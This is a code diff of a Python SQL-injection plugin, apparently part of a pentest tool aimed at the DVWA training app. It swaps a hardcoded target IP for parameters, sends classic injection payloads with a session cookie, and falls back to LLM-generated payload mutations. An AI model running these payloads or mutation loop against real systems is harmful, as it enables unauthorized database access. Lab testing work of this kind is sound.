@@ -4,7 +4,7 @@ import urllib.error
 import socket
 import re
 import time
-import json  # Đã bổ sung import json để sửa lỗi biên dịch
+import json
 from typing import Dict, Any
 from plugins.base_plugin import BasePlugin
 from interaction_logger import InteractionLogger
@@ -29,7 +29,8 @@ class DVWASQLiPlugin(BasePlugin):
     def match(self, service_info: Dict[str, Any]) -> bool:
         return service_info.get("service", "") in ["http", "https"]
 
-    def _send_payload(self, base_url, payload, cookie):
+    def _send_payload(self, base_url, target_ip, target_port, payload, cookie):
+        """Gửi payload GET, bóc tách bản ghi dữ liệu và xử lý Timeout thông minh"""
         try:
             encoded_payload = urllib.parse.quote(payload)
             full_url = f"{base_url}?id={encoded_payload}&Submit=Submit"
@@ -46,7 +47,7 @@ class DVWASQLiPlugin(BasePlugin):
             marker_hit = "First name:" in body or "Surname:" in body or "admin" in output.lower()
 
             self.logger.log_transaction(
-                plugin_id=self.METADATA["id"], target_ip="13.229.112.6", target_port=80,
+                plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                 url=full_url, method="GET", payload=payload, req_headers={"Cookie": cookie},
                 res_status=resp.status, res_headers={}, res_body=output, latency=elapsed, marker_hit=marker_hit
             )
@@ -59,7 +60,7 @@ class DVWASQLiPlugin(BasePlugin):
     def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
         cookie = context.get("session_cookie", "")
         if not cookie:
-            return {"status": "PENDING", "evidence": "Chưa có session cookie"}
+            return {"status": "PENDING", "evidence": "Chưa có session cookie hợp lệ."}
 
         url = f"http://{target_ip}:{target_port}/vulnerabilities/sqli/"
         kb_payloads = ["1' OR '1'='1", "1' UNION SELECT null, user()#"]
@@ -67,7 +68,7 @@ class DVWASQLiPlugin(BasePlugin):
 
         print(f"      [SQLi-Autonomous] Vòng 1: Kiểm thử bằng Knowledge Base...")
         for payload in kb_payloads:
-            res = self._send_payload(url, payload, cookie)
+            res = self._send_payload(url, target_ip, target_port, payload, cookie)
             if res["hit"]:
                 initial_confirmed = {"payload": payload, "output": res["output"]}
                 break
@@ -78,7 +79,7 @@ class DVWASQLiPlugin(BasePlugin):
             ai_plan = groq_generate_payloads(self.METADATA["id"], "sqli_mutation", url, {"telemetry": telemetry_data})
             for item in ai_plan.get("confirm_payloads", []):
                 p_mutated = item.get("payload")
-                res = self._send_payload(url, p_mutated, cookie)
+                res = self._send_payload(url, target_ip, target_port, p_mutated, cookie)
                 if res["hit"]:
                     initial_confirmed = {"payload": p_mutated, "output": res["output"]}
                     break
